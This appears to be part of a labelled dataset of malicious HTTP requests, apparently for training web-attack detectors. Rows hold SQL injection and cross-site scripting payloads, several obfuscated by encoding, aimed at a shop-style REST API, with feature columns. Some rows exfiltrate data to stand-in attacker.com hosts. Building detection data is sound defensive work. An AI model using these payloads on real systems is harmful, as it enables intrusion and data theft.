PUT,/rest/products/9,,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:147,"{""name"": ""Attacked Product"", ""description"": ""New desc ' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.exfil-616.attacker.com\\abc'))) ""}",,malicious,sqli,391,16,0,147,2,97,43,0,0,0.2638,8,49,TRUE,FALSE,FALSE,TRUE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,q=%27%3B+UPDATE+orders+SET+price%3D%276557%27+WHERE+id%3D1%3B+,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,330,21,62,0,1,46,17,7,0,0.2048,0,34,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,category=%2527%2520%2561%256e%2564%2520%2528%2573%2565%254c%2545%2543%2554%2520%2575%2570%2564%2541%2554%2565%2578%256d%256c%2528%2531%252c%2543%256f%254e%2563%2541%2554%2528%2530%2558%2537%2545%252c%2528%2576%2565%2572%2573%2549%256f%254e%2528%2529%2529%252c%2530%2578%2537%2565%2529%2529%2529%252d%252d,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,541,21,304,0,1,177,62,59,59,0.1908,0,27,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/2,id=%27+AND+%28SELECT+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28current_user%28%29%29%2C0x7e%29%29%29%2F%2A,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,318,16,102,0,1,67,23,16,0,0.1949,2,37,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/2,,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:181,"{""name"": ""%41%74%74%41%43%4b%65%44%20%70%52%4f%44%75%63%54"", ""description"": ""nEw+DesC+%27+aNd+UTl_HttP.reQUEst%28%27HTtP%3A%2F%2FexFIl-244.aTTAcKeR.Com%2F%27%7C%7CUSER%28%29%29%23""}",,malicious,sqli,496,16,0,181,2,102,54,30,0,0.2741,1,55,TRUE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/5,,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:70,"{""name"": ""Attacked Product"", ""description"": ""New desc \"" OR 'g'='g'#""}",,malicious,sqli,314,16,0,70,2,22,23,0,0,0.2674,1,33,TRUE,FALSE,FALSE,TRUE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,search=%2527%2520%2561%256e%2564%2520%2574%2552%2555%2545%2520%2541%254e%2564%2520%2573%256c%2545%2565%2550%2528%2534%2529%252f%252a,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,369,21,132,0,1,75,28,25,25,0.183,0,25,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,search=%27+AND+%28SELECT+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28version%28%29%29%2C0x7e%29%29%29%2F%2A,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,338,21,101,0,1,62,22,16,0,0.1803,2,39,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/2,id=%27+UNION+SELECT+NULL%2C+user%28%29%2C+NULL%23,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,242,16,49,0,1,34,14,6,0,0.2154,2,28,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,search=%2527%2520%2541%254e%2544%2520%2528%2553%2545%254c%2545%2543%2554%2520%2555%2550%2544%2541%2554%2545%2558%254d%254c%2528%2531%252c%2543%254f%254e%2543%2541%2554%2528%2530%2578%2537%2565%252c%2528%2564%2561%2574%2561%2562%2561%2573%2565%2528%2529%2529%252c%2530%2578%2537%2565%2529%2529%2529%252d%252d,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,513,21,307,0,1,180,63,60,60,0.1921,0,25,FALSE,FALSE,FALSE,FALSE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/3,id=%27%3B+iNSERT+InTo+CoNFIg+%28PRoduCT_NaMe%29+valueS+%28%27Fuzz_tESt_874%27%29%3B--,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,323,16,85,0,1,64,21,9,0,0.2079,1,39,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/10,id=%2527%2BUNION%2BSELECT%2BNULL%252C%2BNULL%252C%2BNULL%252C%2BNULL%252C%2BNULL%252C%2Bdatabase%2528%2529%252C%2BNULL%2523,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,325,17,123,0,1,82,22,19,10,0.1571,2,33,FALSE,FALSE,FALSE,TRUE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,q=%3Cinput+type%3Dtext+onmouseover%3Dconsole.log%28%27XSS%27%29+autofocus%3E,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,273,21,76,0,1,58,15,8,0,0.1546,2,36,False,False,False,False,3,False,True,False,False,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,query=%3Cbody+onkeydown%3Dalert%281%29%3E,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,278,21,41,0,1,25,9,5,0,0.1452,1,30,False,False,False,False,3,False,True,False,False,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,query=%3Cinput+type%3Dsearch+onkeyup%3Dalert%281%29+autofocus%3E,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,285,21,64,0,1,46,12,6,0,0.1412,2,30,False,False,False,False,3,False,True,False,False,4,3,Tuesday,,,,,,,,,,,,,,
POST,/api/Users/,,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:145,"{""email"": ""<script>alert(1)</script>@example.com"", ""password"": ""password123"", ""passwordRepeat"": ""password123"", ""securityAnswer"": ""My pet's name""}",,malicious,xss,386,11,0,145,4,37,38,0,0,0.2436,6,38,True,False,False,False,2,True,False,False,False,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,search=%26%23x64%3B%26%23x61%3B%26%23x54%3B%26%23x41%3B%26%23x3a%3B%26%23x54%3B%26%23x45%3B%26%23x78%3B%26%23x54%3B%26%23x2f%3B%26%23x68%3B%26%23x54%3B%26%23x6d%3B%26%23x4c%3B%26%23x2c%3B%26%23x25%3B%26%23x33%3B%26%23x63%3B%26%23x53%3B%26%23x43%3B%26%23x52%3B%26%23x49%3B%26%23x70%3B%26%23x54%3B%26%23x25%3B%26%23x33%3B%26%23x65%3B%26%23x63%3B%26%23x4f%3B%26%23x6e%3B%26%23x73%3B%26%23x6f%3B%26%23x6c%3B%26%23x45%3B%26%23x2e%3B%26%23x4c%3B%26%23x4f%3B%26%23x47%3B%26%23x25%3B%26%23x32%3B%26%23x38%3B%26%23x25%3B%26%23x32%3B%26%23x37%3B%26%23x58%3B%26%23x53%3B%26%23x73%3B%26%23x25%3B%26%23x32%3B%26%23x37%3B%26%23x25%3B%26%23x32%3B%26%23x39%3B%26%23x25%3B%26%23x33%3B%26%23x63%3B%26%23x25%3B%26%23x32%3B%26%23x66%3B%26%23x73%3B%26%23x43%3B%26%23x52%3B%26%23x69%3B%26%23x70%3B%26%23x54%3B%26%23x25%3B%26%23x33%3B%26%23x45%3B,HTTP/1.1,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,1027,21,823,0,1,408,207,204,0,0.2453,0,27,False,False,False,False,3,True,True,False,False,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,category=%2526%2523%2578%2533%2563%253b%2526%2523%2578%2537%2533%253b%2526%2523%2578%2537%2536%253b%2526%2523%2578%2536%2537%253b%2526%2523%2578%2532%2566%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2536%2533%253b%2526%2523%2578%2536%2538%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2536%2537%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2533%2564%253b%2526%2523%2578%2536%2533%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2537%2533%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2563%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2532%2565%253b%2526%2523%2578%2536%2563%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2537%253b%2526%2523%2578%2532%2538%253b%2526%2523%2578%2532%2537%253b%2526%2523%2578%2535%2538%253b%2526%2523%2578%2535%2533%253b%2526%2523%2578%2535%2533%253b%2526%2523%2578%2532%2537%253b%2526%2523%2578%2532%2539%253b%2526%2523%2578%2533%2565%253b,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,1267,21,999,0,1,594,201,198,198,0.1971,0,26,False,False,False,False,3,True,True,False,False,4,3,Tuesday,,,,,,,,,,,,,,
POST,/api/Users/,,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:140,"{""email"": ""user2874@example.com"", ""password"": ""password123"", ""passwordRepeat"": ""password123"", ""securityAnswer"": ""<script>alert(1)</script>""}",,malicious,xss,381,11,0,140,4,25,37,0,0,0.245,6,39,True,False,False,False,2,False,False,False,False,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,q=%3CiMG+srC%3Dx+OneRroR%3DaLerT%26%2340%3B1%26%2341%3B%3E,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,326,21,58,0,1,36,15,10,0,0.1899,1,35,False,False,False,False,3,False,True,False,False,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,query=data%253Atext%252Fhtml%252C%25253Cscript%25253Ealert%252528document.domain%252529%25253C%25252Fscript%25253E,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,392,21,188,0,1,111,40,37,37,0.1914,0,26,False,False,False,False,3,False,True,False,False,4,3,Tuesday,,,,,,,,,,,,,,
